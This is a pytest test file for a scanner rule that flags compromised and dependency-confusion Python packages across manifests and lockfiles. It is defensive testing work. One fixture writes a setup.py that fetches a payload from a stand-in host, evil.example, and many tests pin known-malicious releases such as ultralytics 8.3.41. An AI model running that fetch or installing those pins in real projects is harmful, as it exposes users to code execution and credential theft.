import os
from pathlib import Path

import pytest
from guardana.core.report import Finding
from guardana.core.rule import RuleContext
from guardana.core.severity import Severity
from guardana.core.target import ArtifactTarget
from guardana.rules.supply_chain._advisories import Advisory
from guardana.rules.supply_chain._reading import MAX_SCAN_BYTES
from guardana.rules.supply_chain.malicious_dependency import MaliciousDependencyRule


def _findings(tmp_path: Path) -> list[tuple[str, str]]:
    rule = MaliciousDependencyRule()
    return [
        (f.severity.name, f.evidence.summary)
        for f in rule.run(ArtifactTarget(tmp_path), RuleContext())
    ]


def test_flags_known_bad_version_in_requirements(tmp_path: Path) -> None:
    (tmp_path / "requirements.txt").write_text("numpy==1.26.0\nultralytics==8.3.41\n")
    findings = _findings(tmp_path)
    assert len(findings) == 1
    assert findings[0][0] == "HIGH"
    assert "ultralytics" in findings[0][1]


def test_flags_known_bad_version_in_pyproject(tmp_path: Path) -> None:
    (tmp_path / "pyproject.toml").write_text('dependencies = ["ultralytics==8.3.45"]\n')
    assert any("ultralytics" in s for _, s in _findings(tmp_path))


def test_flags_known_bad_version_in_a_poetry_style_lockfile(tmp_path: Path) -> None:
    # poetry.lock / uv.lock / pdm.lock put name and version on separate lines in a
    # [[package]] block — the authoritative pin. A same-line-only scan missed them.
    (tmp_path / "poetry.lock").write_text(
        '[[package]]\nname = "numpy"\nversion = "1.26.0"\n\n'
        '[[package]]\nname = "ultralytics"\nversion = "8.3.41"\ndescription = "x"\n',
        encoding="utf-8",
    )
    findings = _findings(tmp_path)
    assert len(findings) == 1
    assert findings[0][0] == "HIGH"
    assert "ultralytics" in findings[0][1]


def test_safe_version_of_a_watched_package_is_clean(tmp_path: Path) -> None:
    (tmp_path / "requirements.txt").write_text("ultralytics==8.3.200\n")
    assert _findings(tmp_path) == []


def test_a_longer_version_sharing_a_bad_prefix_is_not_flagged(tmp_path: Path) -> None:
    # 8.3.410 is a different, innocent release; a substring test wrongly matched
    # the known-bad 8.3.41 inside it.
    (tmp_path / "requirements.txt").write_text("ultralytics==8.3.410\n", encoding="utf-8")
    assert _findings(tmp_path) == []


def test_safe_version_in_a_lockfile_block_is_clean(tmp_path: Path) -> None:
    (tmp_path / "uv.lock").write_text(
        '[[package]]\nname = "ultralytics"\nversion = "8.3.200"\n', encoding="utf-8"
    )
    assert _findings(tmp_path) == []


def test_unrelated_dependencies_are_clean(tmp_path: Path) -> None:
    (tmp_path / "requirements.txt").write_text("numpy==1.26.0\npandas==2.2.0\n")
    assert _findings(tmp_path) == []


def test_an_old_torch_is_reported_as_a_loader_that_arms_pickle_findings(tmp_path: Path) -> None:
    # torch < 2.6 reaches code execution through torch.load even with
    # weights_only=True, so it is the thing that would run a poisoned checkpoint
    # this same scan looks for. A lead, not a gate failure.
    (tmp_path / "requirements.txt").write_text("torch==2.2.0\n", encoding="utf-8")
    findings = _findings(tmp_path)
    assert [severity for severity, _ in findings] == ["MEDIUM"]
    assert "CVE-2025-32434" in findings[0][1]


def test_flags_network_fetch_in_setup_py(tmp_path: Path) -> None:
    (tmp_path / "setup.py").write_text(
        "from urllib.request import urlopen\nurlopen('http://evil.example/payload')\n",
        encoding="utf-8",
    )
    findings = _findings(tmp_path)
    assert len(findings) == 1
    assert findings[0][0] == "MEDIUM"
    assert "setup.py" in findings[0][1].lower() or "install-time" in findings[0][1]


def test_plain_setup_py_is_clean(tmp_path: Path) -> None:
    (tmp_path / "setup.py").write_text(
        "from setuptools import setup\nsetup(name='x', version='1.0')\n", encoding="utf-8"
    )
    assert _findings(tmp_path) == []


def test_flags_a_compromised_lightning_release_in_a_lockfile(tmp_path: Path) -> None:
    (tmp_path / "poetry.lock").write_text(
        '[[package]]\nname = "lightning"\nversion = "2.6.2"\n', encoding="utf-8"
    )
    findings = _findings(tmp_path)
    assert [severity for severity, _ in findings] == ["HIGH"]
    assert "credential-stealing" in findings[0][1]


def test_flags_a_dependency_confusion_package_at_any_version(tmp_path: Path) -> None:
    # torchtriton on PyPI is not PyTorch's package at all, so no version of it is
    # the one you meant to install — the name is the finding.
    (tmp_path / "requirements.txt").write_text("torchtriton\n", encoding="utf-8")
    assert [severity for severity, _ in _findings(tmp_path)] == ["HIGH"]


def test_flags_a_loader_whose_vulnerability_arms_an_artifact_finding(tmp_path: Path) -> None:
    (tmp_path / "requirements.txt").write_text("transformers==4.57.0\n", encoding="utf-8")
    rule = MaliciousDependencyRule()
    findings = list(rule.run(ArtifactTarget(tmp_path), RuleContext()))
    assert [f.severity.name for f in findings] == ["MEDIUM"]
    assert findings[0].verdict is not None  # a lead: it matters only if something poisoned arrives
    assert "CVE-2026-4372" in findings[0].evidence.summary


def test_a_patched_loader_is_not_flagged(tmp_path: Path) -> None:
    (tmp_path / "requirements.txt").write_text(
        "transformers==5.3.1\ntorch==2.7.0\n", encoding="utf-8"
    )
    assert _findings(tmp_path) == []


def test_a_pre_kernel_dispatch_transformers_is_not_flagged(tmp_path: Path) -> None:
    # The kernel-dispatch path only exists from 4.56.0; older releases do not have
    # the vulnerable code at all, so flagging them would be noise.
    (tmp_path / "requirements.txt").write_text("transformers==4.40.0\n", encoding="utf-8")
    assert _findings(tmp_path) == []


def test_a_range_pin_says_nothing_because_it_pins_nothing(tmp_path: Path) -> None:
    # `torch>=2.0` does not say what gets installed. Guessing would manufacture a
    # finding out of a constraint that may well resolve to a patched release.
    (tmp_path / "requirements.txt").write_text("torch>=2.0\n", encoding="utf-8")
    assert _findings(tmp_path) == []


def test_a_custom_advisory_dataset_is_honoured(tmp_path: Path) -> None:
    advisories = (
        Advisory(
            id="ACME-1",
            package="acme-ml",
            kind="malicious_release",
            versions=("1.0.0",),
            severity=Severity.CRITICAL,
            summary="internal incident 4711",
            reference="https://example.invalid",
        ),
    )
    (tmp_path / "requirements.txt").write_text("acme-ml==1.0.0\n", encoding="utf-8")
    rule = MaliciousDependencyRule(advisories=advisories)
    findings = list(rule.run(ArtifactTarget(tmp_path), RuleContext()))
    assert [f.severity for f in findings] == [Severity.CRITICAL]


def _unverified(findings: list[Finding]) -> list[Finding]:
    return [f for f in findings if f.verdict is not None and f.verdict.outcome == "inconclusive"]


def _run(tmp_path: Path) -> list[Finding]:
    return list(MaliciousDependencyRule().run(ArtifactTarget(tmp_path), RuleContext()))


def test_a_pin_padded_past_the_read_bound_leaves_the_manifest_unverified(tmp_path: Path) -> None:
    manifest = "numpy==1.26.0\n" + "#" * MAX_SCAN_BYTES + "\nultralytics==8.3.41\n"
    (tmp_path / "requirements.txt").write_text(manifest, encoding="utf-8")

    findings = _run(tmp_path)

    assert [f.title for f in findings] == ["Dependency manifest not scanned"]
    assert _unverified(findings) == findings


def test_a_pin_before_the_bound_is_reported_with_the_unread_rest(tmp_path: Path) -> None:
    manifest = "ultralytics==8.3.41\n" + "#" * MAX_SCAN_BYTES + "\n"
    (tmp_path / "requirements.txt").write_text(manifest, encoding="utf-8")

    findings = _run(tmp_path)

    assert [f.severity.name for f in findings] == ["HIGH", "LOW"]
    assert len(_unverified(findings)) == 1


@pytest.mark.skipif(not hasattr(os, "mkfifo"), reason="mkfifo is POSIX-only")
@pytest.mark.parametrize("name", ["requirements.txt", "setup.py"])
def test_an_unreadable_manifest_is_unverified_not_clean(tmp_path: Path, name: str) -> None:
    os.mkfifo(tmp_path / name)

    assert len(_unverified(_run(tmp_path))) == 1


def test_a_setup_py_padded_past_the_read_bound_is_unverified_not_clean(tmp_path: Path) -> None:
    source = "#" * MAX_SCAN_BYTES + "\nimport urllib.request\nurllib.request.urlopen('x')\n"
    (tmp_path / "setup.py").write_text(source, encoding="utf-8")

    findings = _run(tmp_path)

    assert [f.title for f in findings] == ["setup.py not scanned"]
    assert _unverified(findings) == findings


def _summaries(tmp_path: Path, name: str, text: str) -> list[str]:
    (tmp_path / name).write_text(text, encoding="utf-8")
    return [summary for _, summary in _findings(tmp_path)]


@pytest.mark.parametrize(
    ("name", "text"),
    [
        ("requirements.txt", "ultralytics==8.3.041\n"),
        ("requirements.txt", "ultralytics==8.3.41.0\n"),
        ("requirements.txt", "ultralytics == v8.3.41\n"),
        ("requirements.txt", "ultralytics===8.3.41\n"),
        ("requirements.txt", "ultralytics[export]===8.3.41 ; python_version >= '3.9'\n"),
        ("requirements.txt", "ultralytics==8.3.41+cpu\n"),
        ("pyproject.toml", 'dependencies = ["ultralytics===8.3.41"]\n'),
        ("pyproject.toml", '[tool.poetry.dependencies]\nultralytics = "==8.3.41"\n'),
        ("pyproject.toml", '[tool.poetry.dependencies]\nultralytics = "8.3.41.0"\n'),
        ("uv.lock", '[[package]]\nname = "ultralytics"\nversion = "8.3.041"\n'),
    ],
)
def test_a_compromised_release_is_found_in_every_spelling_that_installs_it(
    tmp_path: Path, name: str, text: str
) -> None:
    found = _summaries(tmp_path, name, text)

    assert len(found) == 1
    assert found[0].startswith("ultralytics==") or found[0].startswith("ultralytics===")


@pytest.mark.parametrize(
    "text",
    [
        "ultralytics===8.3.041\n",
        "ultralytics===8.3.41.0\n",
        "ultralytics==8.3.4\n",
        "ultralytics==8.3.41.1\n",
        "ultralytics==8.3.41rc1\n",
        "ultralytics!=8.3.41\n",
    ],
)
def test_a_spelling_that_does_not_install_the_compromised_release_is_clean(
    tmp_path: Path, text: str
) -> None:
    assert _summaries(tmp_path, "requirements.txt", text) == []


def test_the_finding_names_the_pin_as_the_manifest_spells_it(tmp_path: Path) -> None:
    found = _summaries(tmp_path, "requirements.txt", "ultralytics===8.3.41\n")

    assert found[0].startswith("ultralytics===8.3.41:")


@pytest.mark.parametrize(
    "text",
    [
        "Llama_CPP.Python==0.2.71\n",
        "llama.cpp.python==0.2.71\n",
        "LLAMA-CPP-PYTHON==0.2.71\n",
        "llama__cpp--python==0.2.71\n",
    ],
)
def test_a_package_name_matches_in_every_spelling_pep_503_folds_together(
    tmp_path: Path, text: str
) -> None:
    found = _summaries(tmp_path, "requirements.txt", text)

    assert len(found) == 1
    assert "llama-cpp-python" in found[0]


def test_a_lockfile_package_name_matches_in_every_pep_503_spelling(tmp_path: Path) -> None:
    lock = '[[package]]\nname = "Llama_CPP_Python"\nversion = "0.2.71"\n'

    assert len(_summaries(tmp_path, "uv.lock", lock)) == 1


def test_a_wildcard_advisory_matches_a_name_spelled_with_other_separators(tmp_path: Path) -> None:
    advisories = (
        Advisory(
            id="ACME-2",
            package="acme-ml-squat",
            kind="malicious_release",
            versions=("*",),
            severity=Severity.CRITICAL,
            summary="dependency confusion",
            reference="https://example.invalid",
        ),
    )
    (tmp_path / "requirements.txt").write_text("Acme_ML.Squat\n", encoding="utf-8")
    rule = MaliciousDependencyRule(advisories=advisories)

    findings = list(rule.run(ArtifactTarget(tmp_path), RuleContext()))

    assert [f.severity for f in findings] == [Severity.CRITICAL]


_COMPROMISED = "ultralytics==8.3.41"


@pytest.mark.parametrize(
    ("name", "text"),
    [
        (
            "osv-scanner.toml",
            f'[[IgnoredVulns]]\nid = "PYSEC-0"\nreason = "{_COMPROMISED} is a fixture"\n',
        ),
        ("ruff.toml", f'[lint]\nexplanation = "we once shipped {_COMPROMISED}"\n'),
        ("pyproject.toml", f'[project]\nname = "demo"\ndescription = "moved off {_COMPROMISED}"\n'),
        ("pyproject.toml", f'[tool.notes]\ntext = """\n{_COMPROMISED}\n"""\n'),
        ("setup.cfg", f"[metadata]\nname = demo\ndescription = moved off {_COMPROMISED}\n"),
        ("setup.cfg", f"[flake8]\n# {_COMPROMISED}\nmax-line-length = 100\n"),
    ],
)
def test_a_pin_in_configuration_prose_installs_nothing_and_is_clean(
    tmp_path: Path, name: str, text: str
) -> None:
    assert _summaries(tmp_path, name, text) == []


@pytest.mark.parametrize(
    ("name", "text"),
    [
        ("pyproject.toml", f'[project]\ndependencies = ["{_COMPROMISED}"]\n'),
        ("pyproject.toml", f'[project.optional-dependencies]\nexport = ["{_COMPROMISED}"]\n'),
        ("pyproject.toml", f'[dependency-groups]\ndev = ["{_COMPROMISED}"]\n'),
        ("pyproject.toml", f'[build-system]\nrequires = ["{_COMPROMISED}"]\n'),
        ("pyproject.toml", '[tool.poetry.group.dev.dependencies]\nultralytics = "8.3.41"\n'),
        ("pyproject.toml", f'[tool.uv]\nconstraint-dependencies = ["{_COMPROMISED}"]\n'),
        ("pyproject.toml", f'[tool.pdm.dev-dependencies]\ntest = ["{_COMPROMISED}"]\n'),
        ("pyproject.toml", f'[tool.hatch.envs.default]\nextra-dependencies = ["{_COMPROMISED}"]\n'),
        ("pyproject.toml", f'[tool.tox.env_run_base]\ndeps = ["{_COMPROMISED}"]\n'),
        ("uv.toml", f'override-dependencies = ["{_COMPROMISED}"]\n'),
        ("pylock.toml", '[[packages]]\nname = "ultralytics"\nversion = "8.3.41"\n'),
        ("setup.cfg", f"[options]\ninstall_requires =\n    numpy\n    {_COMPROMISED}\n"),
        ("setup.cfg", f"[options.extras_require]\nexport = {_COMPROMISED}\n"),
    ],
)
def test_a_pin_in_a_dependency_table_is_still_found(tmp_path: Path, name: str, text: str) -> None:
    found = _summaries(tmp_path, name, text)

    assert len(found) == 1
    assert found[0].startswith(f"{_COMPROMISED}:")


@pytest.mark.parametrize(
    ("name", "text"),
    [
        ("pyproject.toml", f'[project]\ndependencies = ["{_COMPROMISED}"\n'),
        ("setup.cfg", f"{_COMPROMISED}\n"),
    ],
)
def test_a_manifest_that_does_not_parse_is_still_read_line_by_line(
    tmp_path: Path, name: str, text: str
) -> None:
    assert len(_summaries(tmp_path, name, text)) == 1


def test_a_wildcard_package_counts_only_where_a_dependency_table_names_it(tmp_path: Path) -> None:
    declared = tmp_path / "declared"
    declared.mkdir()
    prose = tmp_path / "prose"
    prose.mkdir()

    found = _summaries(declared, "pyproject.toml", '[project]\ndependencies = ["torchtriton"]\n')
    ignored = _summaries(
        prose, "osv-scanner.toml", '[[IgnoredVulns]]\nreason = """\ntorchtriton\n"""\n'
    )

    assert len(found) == 1
    assert "torchtriton" in found[0]
    assert ignored == []


_CONDA_PIP = f"name: demo\ndependencies:\n  - pip:\n      - {_COMPROMISED}\n"
_LOCK_BLOCK = '[[package]]\nname = "ultralytics"\nversion = "8.3.41"\n'


@pytest.mark.parametrize(
    ("name", "text"),
    [
        ("requirements.txt", f"{_COMPROMISED}\n"),
        ("constraints.txt", f"{_COMPROMISED}\n"),
        ("requirements.in", f"{_COMPROMISED}\n"),
        ("uv.lock", _LOCK_BLOCK),
        ("poetry.lock", _LOCK_BLOCK),
        ("pdm.lock", _LOCK_BLOCK),
        ("Pipfile", '[packages]\nultralytics = "==8.3.41"\n'),
        ("environment.yml", _CONDA_PIP),
        ("environment.yaml", _CONDA_PIP),
        ("conda.yml", _CONDA_PIP),
        ("conda.yaml", _CONDA_PIP),
        ("pyproject.toml", f'[project]\ndependencies = ["{_COMPROMISED}"]\n'),
        ("setup.cfg", f"[options]\ninstall_requires = {_COMPROMISED}\n"),
    ],
)
def test_control_every_file_the_rule_reads_for_pins_finds_a_compromised_one(
    tmp_path: Path, name: str, text: str
) -> None:
    assert len(_summaries(tmp_path, name, text)) == 1


@pytest.mark.parametrize(
    ("name", "text"),
    [
        (
            "pyproject.toml",
            '[tool.poetry.dependencies]\ntorchtriton = { version = "^2.0", source = "x" }\n',
        ),
        (
            "pyproject.toml",
            '[tool.poetry.dependencies]\ntorchtriton = [{version = "2.0"}, {version = "2.1"}]\n',
        ),
        (
            "pixi.toml",
            '[pypi-dependencies]\ntorchtriton = { version = ">=2", index = "https://x.invalid" }\n',
        ),
        ("pyproject.toml", '[tool.pdm.resolution.overrides]\nultralytics = "8.3.41"\n'),
        ("pyproject.toml", '[tool.pdm.resolution]\noverrides = { ultralytics = "8.3.41" }\n'),
        (
            "pyproject.toml",
            f'[tool.flit.metadata]\nrequires-extra = {{ test = ["{_COMPROMISED}"] }}\n',
        ),
        (
            "pyproject.toml",
            f'[tool.hatch.envs.default]\npre-install-commands = ["pip install {_COMPROMISED}"]\n',
        ),
        (
            "pyproject.toml",
            f'[tool.tox.env_run_base]\ncommands = [["pip", "install", "{_COMPROMISED}"]]\n',
        ),
        ("pyproject.toml", f'[tool.cibuildwheel]\nbefore-build = "pip install {_COMPROMISED}"\n'),
        (
            "pyproject.toml",
            f'[[tool.uv.dependency-metadata]]\nname = "x"\nrequires-dist = ["{_COMPROMISED}"]\n',
        ),
        (
            "pyproject.toml",
            '[tool.poetry.dependencies]\nultralytics = { version = "8.3.41", extras = ["x"] }\n',
        ),
        ("pyproject.toml", '[tool.poetry.dependencies.ultralytics]\nversion = "8.3.41"\n'),
        ("setup.cfg", f"[options]\ninstall-requires =\n    {_COMPROMISED}\n"),
        ("setup.cfg", f"[tox:tox]\nenvlist = py\n[testenv]\ndeps =\n    {_COMPROMISED}\n"),
        ("buildout.cfg", f"[buildout]\neggs = {_COMPROMISED}\n"),
    ],
)
def test_a_dependency_in_any_table_or_command_a_tool_reads_is_found(
    tmp_path: Path, name: str, text: str
) -> None:
    """Every value a configuration sets is read but prose; a tool can install from any of them."""
    assert len(_summaries(tmp_path, name, text)) == 1


@pytest.mark.parametrize(
    ("name", "text"),
    [
        ("pyproject.toml", f'[project.optional-dependencies]\ntext = ["{_COMPROMISED}"]\n'),
        ("pyproject.toml", f'[dependency-groups]\nnotes = ["{_COMPROMISED}"]\n'),
        ("pyproject.toml", '[tool.poetry.group.text.dependencies]\nultralytics = "8.3.41"\n'),
        ("pyproject.toml", f'[tool.hatch.envs.text]\ndependencies = ["{_COMPROMISED}"]\n'),
        ("pyproject.toml", f'[tool.pdm.dev-dependencies]\nhelp = ["{_COMPROMISED}"]\n'),
        ("pixi.toml", '[feature.text.pypi-dependencies]\nultralytics = "==8.3.41"\n'),
        ("pixi.toml", f'[tasks]\nhelp = "pip install {_COMPROMISED}"\n'),
        ("tox.toml", f'[env.text]\ndeps = ["{_COMPROMISED}"]\n'),
        ("setup.cfg", f"[options.extras_require]\ntext = {_COMPROMISED}\n"),
        ("pylock.toml", '[[packages]]\nversion = "8.3.41"\nname = "ultralytics"\n'),
    ],
)
def test_a_dependency_under_a_name_that_is_also_a_prose_key_is_found(
    tmp_path: Path, name: str, text: str
) -> None:
    """An extra, a group, an environment or a task may be called `text` or `help`."""
    assert len(_summaries(tmp_path, name, text)) == 1


def test_a_wildcard_package_named_by_a_cfg_key_is_found(tmp_path: Path) -> None:
    assert len(_summaries(tmp_path, "buildout.cfg", "[versions]\ntorchtriton = 2.0.0\n")) == 1


def test_a_reason_in_an_osv_scanner_package_override_is_prose(tmp_path: Path) -> None:
    text = f'[[PackageOverrides]]\nname = "torch"\nreason = "{_COMPROMISED} is a fixture"\n'

    assert _summaries(tmp_path, "osv-scanner.toml", text) == []
